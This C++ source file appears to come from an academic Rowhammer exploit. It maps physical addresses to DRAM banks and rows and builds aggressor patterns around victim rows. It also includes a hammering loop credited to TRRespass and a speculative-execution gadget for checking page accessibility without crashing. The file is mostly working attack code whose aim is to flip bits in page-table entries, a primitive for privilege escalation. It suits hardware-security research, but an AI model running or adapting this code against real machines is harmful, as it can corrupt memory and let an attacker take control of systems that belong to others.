#include "hammer.h"
#include "evict.h"

uint64_t bank_funcs[NR_BANK_FUNCS] = {
	0x2a00,
	0x124044000,
	0x88000,
	0x249910000,
	0x92620000,
};

extern std::vector<vaddr_t> vas; // Virtual addresses of all our sprayed user zero (i.e., PTEs) pages. Indexed by aids.
extern std::vector<vaddr_t> user_vas;
extern std::map<aid_t, physaddr_t> pte_pas; // Physical addresses of the PTEs of our sprayed user zero pages.
extern std::map<aid_t, physaddr_t> udata_pas;

/*
 * @param pa: A physical address.
 * @description: The bank function is used to determine the DRAM bank of a given physical address.
 */

int bank(physaddr_t pa)
{
	int b[5];
	b[0] = BIT(pa,  9) ^ BIT(pa, 11) ^ BIT(pa, 13);
	b[1] = BIT(pa, 14) ^ BIT(pa, 18) ^ BIT(pa, 26) ^ BIT(pa, 29) ^ BIT(pa, 32);
	b[2] = BIT(pa, 15) ^ BIT(pa, 19);
	b[3] = BIT(pa, 16) ^ BIT(pa, 20) ^ BIT(pa, 23) ^ BIT(pa, 24) ^ BIT(pa, 27) ^ BIT(pa, 30) ^ BIT(pa, 33);
	b[4] = BIT(pa, 17) ^ BIT(pa, 21) ^ BIT(pa, 22) ^ BIT(pa, 25) ^ BIT(pa, 28) ^ BIT(pa, 31);
	return (b[4] << 4) | (b[3] << 3) | (b[2] << 2) | (b[1] << 1) | b[0];
}

/*
 * @param pa: A physical address.
 * @description: The row function is used to determine the DRAM row of a given physical address.
 */

int row(physaddr_t pa)
{
	return (int)((pa >> 18) & 0xffff);
}

/*
 * @param pa: A physical address.
 * @description: The mate function is used to determine the mate of a given physical address.
 * The mate is the address that is co-located in the same bank and row as pa.
 */

physaddr_t mate(physaddr_t pa)
{
	return pa ^ (1 << 12);
}

/* @bk: bank number
 * @rw: row number
 * @return: the physical address of the page in the given bank and row.
 */

physaddr_t dram_2_phys(int bk, int rw)
{
	physaddr_t pa = (uint64_t)rw << 18;
	for (int i = 0; i < 5; i++) {
		if (BIT(bank(pa) ^ bk, i))
			pa = pa ^ (1 << (13+i));
	}
	assert(bank(pa) == bk);
	assert(row(pa) == rw);
	return pa;
}

/* Compute the "AVA" (aggressor victim aggressor) pattern making up a double-sided
 * hammering pattern. It consists of 3 rows, so 6 pages.
 * @pa: a page of the victim row.
 * return: success
 */
int compute_ava(physaddr_t pa, physaddr_t p[6])
{
	if (row(pa) == 0 || row(pa) == 0xffff)
		return 0;

	p[0] = dram_2_phys(bank(pa), row(pa)-1);
	p[1] = mate(p[0]);
	p[2] = dram_2_phys(bank(pa), row(pa));
	p[3] = mate(p[2]);
	p[4] = dram_2_phys(bank(pa), row(pa)+1);
	p[5] = mate(p[4]);


#ifdef DEGUB_DO_PRELOAD_TIME
	for (int i = 0; i < 6; i++)
		pr_info("p[%d] = %lx ", i, p[i]);
	pr_info("\n");
#endif

	return 1;
}

/* 
 * @param pa: The physical address of a victim page.
 * @param p: The array of physical addresses of the pages that make up the hammering triplet.
 * @description: Compute the "VXXAXA" pattern making up a "double-sided" hammering pattern (hammering triplet) as seen on the testbed.
 * When testing the testbed for bitflips it seems like the bitflips occur 3 rows apart the "highest"
 * aggressor row. This is most likely due to a combination of some DIMM internal row remapping and/
 * or some quirky new feature on modern CPUs' memory controllers (Section 7.3 in the paper).
 * In this case V=victim row, A=aggressor row, and X="unimportant row".
 */
int compute_vxxaxa(physaddr_t pa, physaddr_t p[6])
{
	if (row(pa) >= 0xfffa)
		return 0;

	p[0] = dram_2_phys(bank(pa), row(pa) + 3);
	p[1] = mate(p[0]);
	p[2] = dram_2_phys(bank(pa), row(pa));
	p[3] = mate(p[2]);
	p[4] = dram_2_phys(bank(pa), row(pa) + 5);
	p[5] = mate(p[4]);


#ifdef DEGUB_DO_PRELOAD_TIME
	for (int i = 0; i < 6; i++)
		pr_info("p[%d] = %lx ", i, p[i]);
	pr_info("\n");
#endif

	return 1;
}


#define TIMESPEC_NSEC(ts) ((ts)->tv_sec * 1e9 + (ts)->tv_nsec)
static inline __attribute__ ((always_inline))
uint64_t realtime_now()
{
	struct timespec now_ts;
	clock_gettime(CLOCK_MONOTONIC, &now_ts);
	return TIMESPEC_NSEC(&now_ts);
}

/*
 * @param aggressors: The array of aggressor rows to access.
 * @description: The core hammering function. Taken from TRRespass.
 */

static uint64_t do_hammer(uint64_t *aggressors[PATT_LEN])
{
	uint64_t t0 = 0, t1 = 0;

	for (int i = 0; i < PATT_LEN; i ++)
		pr_info("aggr[%d] = %p\n", i, (void *)aggressors[i]);

	sched_yield();
	while(abs((int64_t) t1 - (int64_t) t0) < BANK_CONFLICT_THRES) {
		t0 = rdtscp();
		*(volatile char *)aggressors[0];
		clflushopt(aggressors[0]);
		t1 = rdtscp();
	}

	uint64_t cl0, cl1;
	cl0 = realtime_now();

	for(int i = 0; i < PATT_ROUNDS;  i++) {
		mfence();
		for(size_t j = 0; j < PATT_LEN; j++) {
			*(volatile uint64_t*)aggressors[j];
		}
		for(size_t j = 0; j < PATT_LEN; j++) {
			clflushopt(aggressors[j]);
		}
	}

	cl1 = realtime_now();

	return (cl1-cl0) / 1000000;
}

/* Transiently load @first, and then load @second.
 * Assuming a CPU not vulnerable to Meltdown-like effects, the second load will
 * only be executed if the first load completes, i.e., if the first poiner is
 * accessible.
 */
static void transient_dependent_load(void *first, void *second)
{
	asm volatile (
			"call overwrite_arch_return_addr\n\t"
		"spec_return:\n\t"
			"movb (%0), %%al\n\t"		// *first
			"and %%rbx, %%rax\n\n"		// &= 0
			"movb (%1, %%rax), %%al\n\t"	// *(second + rax)
		"infinite_loop:\n\t"
			"pause\n\t"
			"jmp infinite_loop\n\t"
		"overwrite_arch_return_addr:\n\t"
			"movq $arch_return, (%%rsp)\n\t"
			"clflush (%%rsp)\n\t"
			"xor %%rax, %%rax\n\t"
			"cpuid\n\t"
			"xor %%rbx, %%rbx\n\t"
			"ret\n\t"
		"arch_return:\n\t"
		:
		: "r" (first), "r"(second)
		: "%rax", "%rbx", "%rcx", "%rdx"
	);
}

/* Crash-free check whether @p is accesible.
 */
static bool is_accesible(void *p)
{
	static void *rlbuf = NULL;
	if (!rlbuf) {
		rlbuf = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
		assert(rlbuf != MAP_FAILED);
		memset(rlbuf, 0x97, PAGE_SIZE);
	}

	for (int i = 0; i < 10; i++) {
		cpuid();
		clflush(rlbuf);
		cpuid();
		transient_dependent_load(p, rlbuf);
		cpuid();
		uint64_t t0 = rdtscp();
		load(rlbuf);
		uint64_t t1 = rdtscp();
		if (t1 - t0 < 180)
			return true;
	}

	return false;
}

/* Test `is_accessible`'s functional correctness. Not used during exploit.
 */
static void test_is_accessible(void)
{
	char *p = (char *)mmap((void *)0x12345000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	assert(p != MAP_FAILED);
	memset(p, 0x79, PAGE_SIZE);

	for (int k = 0; k < 3; k++)
		for (int i = -0x400; i < 0x1600; i += 0x200)
			printf("is_accesible(p+%5d): %d %s\n", i, is_accesible(p+i), 0 <= i && i < PAGE_SIZE ? "<-- should be accessible" : "");

	printf("is_accesible(NULL): %d\n", is_accesible(NULL));

	munmap(p, PAGE_SIZE);
}

static int verify_hammer(uint64_t *victims[PATT_LEN])
{
	int flipped;

	flipped = 0;
	for(uint i = 0; i < PATT_LEN; ++i) {
		evict_tlb((uint8_t *)victims[i]);
	}
	cpuid();

	for(uint i = 0; i < PATT_LEN; ++i) {
		if (!is_accesible(victims[i]))
			continue;

		for(uint j = 0; j < PAGE_SIZE / sizeof(uint64_t); ++j) {
			clflush(victims[i] + j);
			cpuid();
			if(*(victims[i] + j)) {
				pr_info("[FLIP]");
				flipped = 1;
			}
		}
	}

	return flipped;
}

int hammer(std::vector<hamm_patt_t>& hamm_pairs)
{
	uint64_t *aggs[PATT_LEN];
	uint64_t *vics[PATT_LEN];
	aid_t vic_aids[PATT_LEN];
	aid_t agg_aids[PATT_LEN];
	std::set<int> visited_rows;
	physaddr_t pa;
	int rw;
	uint vic_i = 0, agg_i = 0;
	
	for(const auto &pair : hamm_pairs) {
		for(const auto &vic : pair.first) {
			vics[vic_i] = (uint64_t *) vas.at(vic).get_ptr();
			vic_aids[vic_i] = vic;
			++vic_i;
		}
		for(const auto &agg : pair.second) {
			pa = udata_pas.at(agg);
			rw = row(pa);
			if(visited_rows.count(rw) == 0) {
				aggs[agg_i] = (uint64_t *) user_vas.at(agg).get_ptr();
				agg_aids[agg_i] = agg;
				visited_rows.insert(rw);
				++agg_i;
			}
			
		}
	}

	// TODO: sometimes we get the same hammer pair twice because of how we pick the aids i.e., we coud pick the first aid that maps to one page in the row and later pick the other. Ignore for now as it should only lead to a failed hammering attempt.
	pr_info("visited rows size = %zu\n", visited_rows.size());
	if(visited_rows.size() != PATT_LEN) {
		return 0;
	}
	// assert(visited_rows.size() == PATT_LEN);
	
	pr_info("About to hammer...\n");

	pr_info("VICTIMS = {");
	for(uint i = 0; i < PATT_LEN; ++i) {
		pa = pte_pas.at(vic_aids[i]);
		pr_info("%p (bk %d, rw = %d) ", (void *) vics[i], bank(pa), row(pa));
	}
	pr_info("}\n");

	pr_info("AGGRESSORS = {");
	for(uint i = 0; i < PATT_LEN; ++i) {
		pa = udata_pas.at(agg_aids[i]);
		pr_info("%p (bk %d, rw = %d) ", (void *) aggs[i], bank(pa), row(pa));
	}
	pr_info("}\n");

#define N_RETRIES 10

	for(uint i = 0; i < N_RETRIES; ++i) {
		do_hammer(aggs);
		//procfs_sim_hammer(pte_pas.at(vic_aids[0]));
		if(verify_hammer(vics)) {
			pr_info("\n\nSuccess :)\n\n");
			return 1;
		}
	}

	for(uint i = 0; i < PATT_LEN; ++i) {
		for(uint j = 0; j < PAGE_SIZE / sizeof(uint64_t); ++j) {
			*(aggs[i] + j) = hammering_pte_data_patt_inverse;
		}
	}

	for(uint i = 0; i < N_RETRIES; ++i) {
		do_hammer(aggs);
		if(verify_hammer(vics)) {
			pr_info("\n\nSuccess :)\n\n");
			return 1;
		}
	}

	//restore original data patt
	for(uint i = 0; i < PATT_LEN; ++i) {
		for(uint j = 0; j < PAGE_SIZE / sizeof(uint64_t); ++j) {
			*(aggs[i] + j) = hammering_pte_data_patt;
		}
	}

	return 0;
}




static inline bool comp_pair_second(const std::pair<int, int>& a, const std::pair<int, int>& b)
{
	return a.second < b.second;
}

std::vector<hamm_patt_t> get_min_dist_patt(bank_t target_bk, const std::map<bank_t, std::vector<hamm_patt_t>>& bk_to_patts)
{
    std::vector<hamm_patt_t> min_dist_patt;
    std::vector<std::pair<aid_t, int>> vics;
    aid_t aid;
    int rw;

    for(const auto& patt : bk_to_patts.at(target_bk)) {
        aid = patt.first.at(0);
        rw = row(pte_pas.at(aid));
        vics.push_back(std::make_pair(aid, rw));
    }

    std::sort(vics.begin(), vics.end(), comp_pair_second);
    //vics.resize(PATT_LEN / 2);

    for(const auto& [vic_aid, vic_row]  : vics) {
		for(const auto& patt : bk_to_patts.at(target_bk)) {
			if(vic_aid == patt.first.at(0)) {
				min_dist_patt.push_back(patt);
			}
		}
    }

    // assert((min_dist_patt.size() == (PATT_LEN / 2)) && "minimal distance pattern is not PATT_LEN/2");

    return min_dist_patt;
}
